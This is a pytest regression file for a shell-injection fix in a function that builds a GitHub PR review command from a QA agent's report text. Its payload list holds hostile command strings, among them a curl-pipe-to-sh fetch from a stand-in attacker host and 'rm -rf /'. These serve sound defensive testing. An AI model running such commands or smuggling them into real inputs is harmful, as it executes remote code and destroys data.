"""Regression test for GAP-0091.

`build_pr_review_command` previously interpolated the QA report body into a
double-quoted shell argument after only replacing `"` -> `'`, leaving
`$()`, backticks, `;`, and newlines able to break out of the quoting and
execute when QA_AGENT_EXECUTE_COMMANDS=1. The fix shell-quotes the body with
shlex.quote. These tests are pure/offline (no AWS, no exec).
"""

from __future__ import annotations

import shlex
import subprocess

import pytest

from app.services.agent_qa import build_pr_review_command

INJECTION_PAYLOADS = [
    "$(reboot)",
    "`id`",
    '"$(curl attacker.example/x|sh)"',
    "'; rm -rf /; echo '",
    "\n--body injected",
    "${IFS}",
    "pass; touch /tmp/pwned",
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_build_pr_review_command_no_shell_injection(payload):
    """The report body must survive as a single, literal shell token."""
    cmd = build_pr_review_command(pr_number=42, verdict="pass", report=payload)

    # The generated string must parse via shlex (proper quoting) and the body
    # must be exactly one token equal to the literal (stripped) payload, i.e.
    # no metacharacter escaped the quoting to become extra tokens / operators.
    tokens = shlex.split(cmd)
    body_idx = tokens.index("--body") + 1
    assert tokens[body_idx] == payload.strip()
    # --body must be the last flag: no injected tokens trail the body value.
    assert body_idx == len(tokens) - 1


def test_build_pr_review_command_body_not_evaluated_by_real_shell():
    """Hand the generated command to a real shell (with `gh` stubbed as echo)
    and confirm the command-substitution / backtick payload is passed through
    LITERALLY rather than executed. This is the behaviour that fails before the
    shlex.quote fix (a real shell expands `$()`/backticks inside the old
    double-quoted argument) and passes after it.
    """
    # Benign substitutions. If the shell EXPANDS them, the literal source
    # forms ("$(printf MARK)" / "`printf MARK`") vanish and only "MARK"
    # remains. If treated literally (the fix), the exact source forms survive.
    sub = "$(printf SUBMARK)"
    tick = "`printf TICKMARK`"
    payload = f"report-{sub}-{tick}-end"
    cmd = build_pr_review_command(pr_number=42, verdict="pass", report=payload)

    # Stub `gh` so nothing real runs: a shell function that prints its args.
    script = f'gh() {{ printf "%s" "$*"; }}\n{cmd}'
    out = subprocess.run(
        ["bash", "-c", script],
        capture_output=True,
        text=True,
        check=True,
    ).stdout

    # Literal source substitution syntax must survive verbatim...
    assert sub in out and tick in out, f"shell expanded the payload: {out!r}"
    # ...and the expanded-only results must NOT appear on their own.
    assert "SUBMARK" in out  # only as part of the literal $(printf SUBMARK)
    assert out.count("SUBMARK") == 1
    assert out.count("TICKMARK") == 1


def test_build_pr_review_command_verdict_flags():
    assert "--approve" in build_pr_review_command(
        pr_number=7, verdict="pass", report="clean"
    )
    assert "--approve" in build_pr_review_command(
        pr_number=7, verdict="flaky", report="clean"
    )
    assert "--request-changes" in build_pr_review_command(
        pr_number=7, verdict="fail", report="clean"
    )
